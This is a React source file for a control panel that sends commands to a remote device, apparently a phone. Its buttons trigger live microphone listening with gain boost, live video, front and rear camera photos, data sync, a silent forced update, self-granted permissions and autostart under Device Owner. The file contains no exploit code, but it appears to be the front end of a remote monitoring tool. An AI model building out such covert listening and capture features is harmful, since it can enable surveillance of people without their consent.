import { useState } from 'react';
const GAIN_LEVELS = [{
  label: '1× Normal',
  value: 1.0,
  color: '#a1a1aa',
  bg: '#27272a'
}, {
  label: '1.5× Boost',
  value: 1.5,
  color: '#bae6fd',
  bg: '#0284c7'
}, {
  label: '2× Loud',
  value: 2.0,
  color: '#6ee7b7',
  bg: '#059669'
}, {
  label: '3× Max',
  value: 3.0,
  color: '#fde68a',
  bg: '#d97706'
}, {
  label: '4× Ultra',
  value: 4.0,
  color: '#fecaca',
  bg: '#dc2626'
}];
const VOICE_PROFILES = ['near', 'room', 'far'];
const VOICE_ICONS = {
  near: '🎙',
  room: '🔊',
  far: '📢'
};
const VOICE_COLORS = {
  near: {
    color: '#e0f2fe',
    bg: '#0284c7',
    border: '#0369a1'
  },
  room: {
    color: '#e0e7ff',
    bg: '#4f46e5',
    border: '#3730a3'
  },
  far: {
    color: '#fef3c7',
    bg: '#d97706',
    border: '#b45309'
  }
};
const NIGHT_MODES = ['off', '1s', '3s', '5s'];
const NIGHT_LABELS = {
  off: 'Night: Off',
  '1s': 'Night: Low',
  '3s': 'Night: Med',
  '5s': 'Night: High'
};
export function ControlButtons({
  onCommand,
  health,
  isStreaming = false,
  isWebRtcActive = false,
  isCameraLive = false
}) {
  const [voiceProfile, setVoiceProfile] = useState(health?.voiceProfile || 'room');
  const [photoNight, setPhotoNight] = useState(health?.photoNight || 'off');
  const [gainIndex, setGainIndex] = useState(0);
  const cycleVoiceProfile = () => {
    const next = VOICE_PROFILES[(VOICE_PROFILES.indexOf(voiceProfile) + 1) % VOICE_PROFILES.length];
    setVoiceProfile(next);
    onCommand('voice_profile', {
      profile: next
    });
  };
  const cyclePhotoNight = () => {
    const next = NIGHT_MODES[(NIGHT_MODES.indexOf(photoNight) + 1) % NIGHT_MODES.length];
    setPhotoNight(next);
    onCommand('photo_night', {
      mode: next
    });
  };
  const cycleGain = () => {
    const nextIndex = (gainIndex + 1) % GAIN_LEVELS.length;
    setGainIndex(nextIndex);
    onCommand('set_gain', {
      level: GAIN_LEVELS[nextIndex].value
    });
  };
  const gain = GAIN_LEVELS[gainIndex];
  const vc = VOICE_COLORS[voiceProfile];
  return <div className="space-y-4">
      {/* ── Audio ──────────────────────────────────────────────────────── */}
      <section>
        <SectionHead icon="🎙" label="Audio" />
        <div className="grid grid-cols-2 gap-2">
          {/* Live Listen */}
          <BigBtn icon={isStreaming ? '⏹' : '🎧'} label={isStreaming ? 'Stop Listen' : 'Live Listen'} onClick={() => onCommand(isStreaming ? 'stop_stream' : 'start_stream')} active={isStreaming} activeColor="#10b981" activeBorder="#059669" activeText="#ffffff" inactiveColor="#27272a" inactiveBorder="#3f3f46" inactiveText="#a1a1aa" />
          {/* WebRTC */}
          <BigBtn icon="📡" label={isWebRtcActive ? 'Stop WebRTC' : 'WebRTC'} onClick={() => onCommand(isWebRtcActive ? 'webrtc_stop' : 'webrtc_start')} active={isWebRtcActive} activeColor="#3b82f6" activeBorder="#2563eb" activeText="#ffffff" inactiveColor="#27272a" inactiveBorder="#3f3f46" inactiveText="#a1a1aa" />

          {/* Voice Profile */}
          <button onClick={cycleVoiceProfile} className="rounded-lg px-3 py-3 flex flex-col items-center gap-1 transition-all duration-200 text-center font-semibold" style={{
          background: vc.bg,
          border: `2px solid ${vc.border}`,
          color: vc.color
        }}>
            <span className="text-xl">{VOICE_ICONS[voiceProfile]}</span>
            <span className="text-[10px] font-bold uppercase tracking-wider">
              Voice: {voiceProfile.charAt(0).toUpperCase() + voiceProfile.slice(1)}
            </span>
          </button>
        </div>

        {/* Gain slider-style row */}
        <button onClick={cycleGain} className="w-full mt-2 rounded-lg px-4 py-2.5 flex items-center justify-between gap-3 transition-all duration-200" style={{
        background: gain.bg,
        border: `2px solid ${gain.bg === '#27272a' ? '#3f3f46' : gain.color}`,
        color: gain.color
      }}>
          <span className="text-base">🔊</span>
          <span className="text-xs font-bold flex-1 text-left">
            Gain: {gain.label}
          </span>
          {/* Visual gain meter */}
          <div className="flex items-end gap-0.5 h-4">
            {GAIN_LEVELS.map((_, i) => <div key={i} className="w-1.5 rounded-sm transition-all duration-300" style={{
            height: `${4 + i * 20}%`,
            background: i <= gainIndex ? gain.color : `${gain.color}25`,
            minHeight: '4px'
          }} />)}
          </div>
          <span className="text-[10px] opacity-60">TAP TO CYCLE</span>
        </button>
      </section>

      {/* ── Camera ──────────────────────────────────────────────────────── */}
      <section>
        <SectionHead icon="📷" label="Camera" />
        <div className="grid grid-cols-2 gap-2">
          <BigBtn icon={isCameraLive ? '📺' : '📺'} label={isCameraLive ? 'Stop Video' : 'Live Video'} onClick={() => onCommand(isCameraLive ? 'camera_live_stop' : 'camera_live_start')} active={isCameraLive} activeColor="#ef4444" activeBorder="#dc2626" activeText="#ffffff" inactiveColor="#27272a" inactiveBorder="#3f3f46" inactiveText="#a1a1aa" />
          <SmallBtn icon="📷" label="Front Cam" onClick={() => onCommand('take_photo', { camera: 'front' })} color="#38bdf8" />
          <SmallBtn icon="📷" label="Rear Cam" onClick={() => onCommand('take_photo', { camera: 'rear' })} color="#818cf8" />
          <SmallBtn icon="🌙" label={NIGHT_LABELS[photoNight]} onClick={cyclePhotoNight} color={photoNight !== 'off' ? '#e879f9' : '#64748b'} active={photoNight !== 'off'} />
        </div>
      </section>

      {/* ── System ──────────────────────────────────────────────────────── */}
      <section>
        <SectionHead icon="⚙️" label="System" />
        <div className="grid grid-cols-2 gap-2">
          <SmallBtn icon="📥" label="Sync Data" onClick={() => onCommand('get_data')} color="#38bdf8" />
          <SmallBtn icon="⬆️" label="Force Update" onClick={() => onCommand('force_update')} color="#818cf8" tooltip="Silent if Device Owner" />
          <SmallBtn icon="🔐" label="Grant Perms" onClick={() => onCommand('grant_permissions')} color="#818cf8" tooltip="Requires Device Owner" />
          <SmallBtn icon="🚀" label="Autostart" onClick={() => onCommand('enable_autostart')} color="#fb923c" tooltip="Requires Device Owner" />
        </div>
      </section>
    </div>;
}

// ── Sub-components ─────────────────────────────────────────────────────────────

function SectionHead({
  icon,
  label
}) {
  return <div className="flex items-center gap-2 mb-2">
      <span className="text-sm">{icon}</span>
      <span className="text-[10px] uppercase tracking-widest font-bold text-cyan-300">{label}</span>
      <span className="flex-1 h-px" style={{
      background: 'linear-gradient(90deg, rgba(34,211,238,0.45), transparent)'
    }} />
    </div>;
}
function BigBtn({
  icon,
  label,
  onClick,
  active,
  activeColor,
  activeBorder,
  activeText,
  inactiveColor,
  inactiveBorder,
  inactiveText
}) {
  const bg = active ? activeColor : inactiveColor;
  const border = active ? activeBorder : inactiveBorder;
  const color = active ? activeText : inactiveText;
  return <button onClick={onClick} className="rounded-xl px-3 py-3 flex flex-col items-center gap-1 transition-all duration-200" style={{
    background: bg,
    border: `1px solid ${border}`,
    color,
    boxShadow: active ? `0 0 20px ${activeColor}` : '0 10px 20px rgba(2,6,23,0.24)'
  }} onMouseEnter={e => {
    e.currentTarget.style.transform = 'scale(1.02)';
  }} onMouseLeave={e => {
    e.currentTarget.style.transform = 'scale(1)';
  }}>
      <span className="text-xl">{icon}</span>
      <span className="text-[10px] font-bold uppercase tracking-wider text-center leading-tight">{label}</span>
    </button>;
}
function SmallBtn({
  icon,
  label,
  onClick,
  color,
  active = false,
  tooltip
}) {
  return <button onClick={onClick} title={tooltip} className="rounded-xl px-3 py-2.5 flex items-center gap-2 text-left transition-all duration-200 w-full" style={{
    background: active ? `${color}22` : 'linear-gradient(165deg, rgba(30,41,59,0.42), rgba(15,23,42,0.34))',
    border: `1px solid ${active ? `${color}50` : 'rgba(148,163,184,0.14)'}`,
    color: active ? color : '#94a3b8'
  }} onMouseEnter={e => {
    e.currentTarget.style.background = `${color}18`;
    e.currentTarget.style.color = color;
  }} onMouseLeave={e => {
    e.currentTarget.style.background = active ? `${color}22` : 'rgba(255,255,255,0.04)';
    e.currentTarget.style.color = active ? color : '#94a3b8';
  }}>
      <span className="text-base">{icon}</span>
      <span className="text-xs font-semibold">{label}</span>
    </button>;
}